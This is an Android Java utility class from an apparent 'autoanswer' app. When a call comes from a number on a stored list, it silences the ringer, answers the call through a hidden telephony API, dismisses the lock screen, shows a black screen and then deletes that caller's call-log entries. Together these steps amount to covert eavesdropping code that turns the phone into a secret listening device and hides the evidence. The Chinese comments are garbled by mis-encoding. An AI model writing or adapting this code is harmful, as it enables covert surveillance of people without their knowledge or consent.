package com.yfm.autoanswer;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.app.KeyguardManager;
import android.app.KeyguardManager.KeyguardLock;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Handler;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class PhoneUtils {

	public static String TAG = PhoneUtils.class.getSimpleName();
	public static boolean isguaduan=false;
	@SuppressWarnings("rawtypes")
	private static Object getTelephonyObject(Context context) {
		Object telephonyObject = null;
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Class telManager = telephonyManager.getClass();
			Method getITelephony = telManager
					.getDeclaredMethod("getITelephony");
			getITelephony.setAccessible(true);
			telephonyObject = getITelephony.invoke(telephonyManager);
		} catch (SecurityException e) {
			e.printStackTrace();
		} catch (NoSuchMethodException e) {
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			e.printStackTrace();
		}
		return telephonyObject;
	}

	/**
	 * ͨ��������õķ����������绰���÷���ֻ��android 2.3֮ǰ��ϵͳ����Ч��
	 * 
	 * @param context
	 */
	@SuppressWarnings("rawtypes")
	private static void answerRingingCallWithReflect(Context context) {
		try {
			Object telephonyObject = getTelephonyObject(context);
			if (null != telephonyObject) {
				Class telephonyClass = telephonyObject.getClass();
				Method endCallMethod = telephonyClass
						.getMethod("answerRingingCall");
				endCallMethod.setAccessible(true);

				endCallMethod.invoke(telephonyObject);

			}
		} catch (Exception e) {
			Toast.makeText(context, "Ȩ�޲���,����root���ϵͳ�������������system/appĿ¼�£���root explorer���������޸����Ȩ�ޣ�", Toast.LENGTH_LONG).show();
			e.printStackTrace();
		}
	}

	/**
	 * 
	 * @param context
	 */
	public static void answerRingingCall(Context context,String phonenumber) {
		try {
			SqlUtils su=new SqlUtils(context);
			if(su.queryPhone(phonenumber)){
				Log.i("����", "����");
				jinyin(context);
				answerRingingCallWithReflect(context);
				isguaduan=true;
				sleepsystem(context);
				context.getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true,new CallLogObserver(context,new Handler(),phonenumber));
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		

	}
	
	
	private static class CallLogObserver extends ContentObserver {
        private String incomingNumber;
        private Context context;

        public CallLogObserver(Context context,Handler handler, String incomingNumber) {
                super(handler);
                this.incomingNumber = incomingNumber;
                this.context=context;
        }

        // ���۲쵽���ݷ����ı��ʱ�� ���õķ���.
        @Override
        public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                deleteFromCallLog(context,incomingNumber);
                context.getContentResolver().unregisterContentObserver(this);
        }

}
	
	public static void deleteFromCallLog(Context context,String incomingNumber) {
        Log.i(TAG, "ɾ�����м�¼:" + incomingNumber);
        Uri uri = Uri.parse("content://call_log/calls");// �õ����м�¼�����ṩ�ߵ�·��
        Cursor cursor = context.getContentResolver().query(uri, new String[] { "_id" },
                        "number=?", new String[] { incomingNumber }, null);
        while (cursor.moveToNext()) {
                String id = cursor.getString(0);
                context.getContentResolver().delete(uri, "_id=?", new String[] { id });
        }
        cursor.close();
}

	
	public static void sleepsystem(Context context){
		try {
			KeyguardManager keyguardManager = (KeyguardManager)context.getSystemService(Context.KEYGUARD_SERVICE);
			KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("");
			keyguardLock.disableKeyguard();
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			Intent intent=new Intent(context,HeipingActicity.class);
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
			context.startActivity(intent);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	private static int rmod=-999;
	public static void jinyin(Context context){
		try {
			AudioManager audioMgr = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
			rmod=audioMgr.getRingerMode();
			audioMgr.setRingerMode(AudioManager.RINGER_MODE_SILENT);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public static void huifu(Context context){
		try {
			if(rmod!=-999){
				Log.i("�ָ�����", "����");
				AudioManager audioMgr = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
				audioMgr.setRingerMode(rmod);
			}
			rmod=-999;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}



}